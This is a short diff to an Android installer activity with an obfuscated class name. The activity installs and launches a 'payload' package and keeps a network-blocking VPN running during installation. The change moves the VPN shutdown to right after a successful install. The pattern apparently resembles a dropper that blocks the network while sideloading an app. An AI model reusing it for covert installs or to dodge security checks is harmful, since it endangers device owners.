@@ -448,9 +448,15 @@ public class A4450c4b785 extends Activity {
     /**
      * Post-install launch: polls until the freshly-installed package is
      * queryable (PackageManager can lag briefly after session commit), then
-     * launches the module app, drops the VPN, and closes the installer.
+     * launches the module app and closes the installer. The VPN is stopped
+     * immediately after the successful install result, before this polling.
      */
     private void launchPayloadAndExit() {
+        // Installation has already succeeded at this point. Do not keep the
+        // blocking VPN active while waiting for PackageManager to expose the
+        // newly-installed package or while launching it.
+        stopVpn();
+
         final String pkg = BuildConfig.PAYLOAD_PACKAGE;
         if (pkg == null || pkg.isEmpty()) {
             if (status != null) status.setText("Installed.");
@@ -463,7 +469,6 @@ public class A4450c4b785 extends Activity {
                 if (launch != null) {
                     try {
                         startActivity(launch);
-                        stopVpn();
                         ui.postDelayed(A4450c4b785.this::finish, 150);
                     } catch (Exception e) {
                         if (status != null) status.setText("Launch failed: " + e.getMessage());
